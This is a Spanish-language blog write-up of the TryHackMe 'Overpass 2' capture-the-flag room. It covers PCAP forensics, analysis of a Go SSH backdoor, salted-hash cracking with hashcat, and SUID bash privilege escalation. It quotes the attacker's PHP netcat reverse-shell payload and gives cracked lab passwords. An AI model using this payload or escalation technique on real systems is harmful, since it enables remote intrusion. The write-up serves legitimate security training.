---                                                                                                                                             
layout: post 
title:  "Overpass2 - TryHackme - WriteUp/Walkthrough"                                                                                        
summary: "Resolución de la máquina overpass2 de la plataforma de tryhackme" 
author: r4z0r                                                                                                                                   
date: '2021-09-15 14:35:23 +0530'                                                                                                               
category: ['tryhackme','writeup','walkthrough']                                                                                  
thumbnail: /assets/img/posts/overpass2/overpass-fondo.jpg
keywords: overpass2,tryhackme,writeup,walkthrough                                               
permalink: /blog/overpass-tryhackme-writeup/                                                                                         
--- 

Continuamos con la ruta de la certificación Offensive Pentesting, hoy resolvemos el reto Overpass 2, está bastante sencillita así que pasemos a la resolución.

![overpass](/assets/img/posts/overpass2/overpass-thm.png)

## Task 1 – Forensics – Analyse the PCAP

Lo primero que debemos hacer es descargarnos el archivo overpass2.pcap.png que nos provee el desafío. Posterior a eso debemos utilizar la herramienta editcap para traducir el archivo a .pcap y luego poder abrirlo con wireshark.

![editcap](/assets/img/posts/overpass2/1.png "editcap")

Una vez abierto la captura, nos dirigimos al paquete que se muestra en la flecha, podemos ver que está haciendo uso del método POST.

![wireshark](/assets/img/posts/overpass2/2.png)

![tcpstream](/assets/img/posts/overpass2/3.png)

Con esto podemos responder a las siguientes preguntas:

**What was the URL of the page they used to upload a reverse shell?** ->  /development/
**What payload did the attacker use to gain access?** -> &lt;?php exec(“rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f”)?>

Ahora abrimos otro paquete más abajo.

![wireshark2](/assets/img/posts/overpass2/4.png)

![tcpstream2](/assets/img/posts/overpass2/5.png)

Eso responde a la pregunta:

**What password did the attacker use to privesc?** ->  whenevernoteartinstant

![gitclone](/assets/img/posts/overpass2/6.png)

**How did the attacker establish persistence?** -> https://github.com/NinjaJc01/ssh-backdoor

Para responder a la última pregunta de la sección debemos copiar los hashes en un archivo y utilizar john junto con el diccionario fasttrack.txt

![hashes](/assets/img/posts/overpass2/7-hashes.png)

![jhon](/assets/img/posts/overpass2/8.png)

Como se ve en la imágen hay 4 hashes crackeable.

**Using the fasttrack wordlist, how many of the system passwords were crackable?** -> 4

---

## Task 2 – Research – Analyse the code

Pasando a la tarea 2, ahora que hemos encontrado el código de la puerta trasera, es hora de analizarlo. Para eso nos dirigimos al repositorio que se ve en la captura.

![gitclone](/assets/img/posts/overpass2/6.png)

![git](/assets/img/posts/overpass2/9.png)

Nos dirigimos a main.go

![main](/assets/img/posts/overpass2/10.png)

Acá podemos responder a la primer pregunta:

**What’s the default hash for the backdoor?** -> bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3

Bajamos más…

![verifypass](/assets/img/posts/overpass2/11.png)

![hash](/assets/img/posts/overpass2/12.png)

Aquí tenemos la respuesta a la pregunta:
**What’s the hardcoded salt for the backdoor?** -> 1c362db832f3f864c8c2fe05f2002a05

Ahora tenemos que volver a la captura que abrimos anteriormente.

![wireshark3](/assets/img/posts/overpass2/13.png)

![backdoor](/assets/img/posts/overpass2/14.png)

Aquí encontramos el hash que utiliza el atacante.
**What was the hash that the attacker used? – go back to the PCAP for this!** -> 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed

Bien, ya tenemos la salt y el hash, ahora toca crackearlo, para eso buscamos ejemplos de hashes en la página de hashcat.

![hashcatexamples](/assets/img/posts/overpass2/15.png)

Ahí se nos lista cómo debemos crackearlo.

```bash
hashcat -m 1710 "6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05" --force /usr/share/wordlists/rockyou.txt
```

![hashcat](/assets/img/posts/overpass2/16.png)

**Crack the hash using rockyou and a cracking tool of your choice. What’s the password?** -> november16
Ya tenemos el password para acceder vía SSH: **november16**

## TASK 3 ATTACK - GET BACK IN!

Para responder a la primera pregunta debemos acceder al puerto 80 donde está corriendo la página del desafío.

![cooctusClan](/assets/img/posts/overpass2/coscu.png)

**The attacker defaced the website. What message did they leave as a heading?** -> H4ck3d by CooctusClan
Posterior a eso, intenté acceder vía ssh pero no me daba el puerto por defecto el 22, entonces tuve que enumerar los puertos con nmap

![nmap1](/assets/img/posts/overpass2/18.png)

**-sC = Para ejecutar una serie de scripts sobre los puertos.**
**-sV = Enumerar servicios y versiones.**
**-oN = Para exportarlo en un formato normal a la carpeta nmap donde el archivo se llamará initial.**

Una vez que tengamos el número del puerto por el que está corriendo ssh nos conectamos a él. El usuario es james, ya que en la captura que estuvimos analizando vemos que utiliza este nombre.
Logramos la conexión, ahora a buscar las flags.

![flaguser](/assets/img/posts/overpass2/19.png)

Bien, ya tenemos la primera flag del usuario. Ahora listemos los binarios que tengan asignados permisos SUID. Por cierto tengo en mi blog cómo abusar de estos permisos para elevar privilegios.

![find](/assets/img/posts/overpass2/20.png)

Tenemos un binario con permisos suid, donde pasandolé como parámetro la flag -p podemos escalar privilegios y ser usuario root, esto es gracias a que el usuario propietario del binario(el que creó el binario) es el usuario root, por lo tanto al ejecutarlo con la flag -p .
La -p opción permite a bash mantener el ID de usuario efectivo con el que se inicia, mientras que sin él, establecerá el uid efectivo en el uid real (su usuario). Esto permite que el bit setuid sea efectivo para permitir que bash retenga al usuario al que está configurado. Es decir ejecutarse con el uid efectivo de root.

![rootflag](/assets/img/posts/overpass2/21.png)

Con esto ya resolvemos el reto, Felicidades!!😃
Compártelo con tus amigos y sigue aprendiendo de este hermoso mundo del hacking, te veo luego 

[R4z0r](https://juankaenel.github.io)👨‍💻

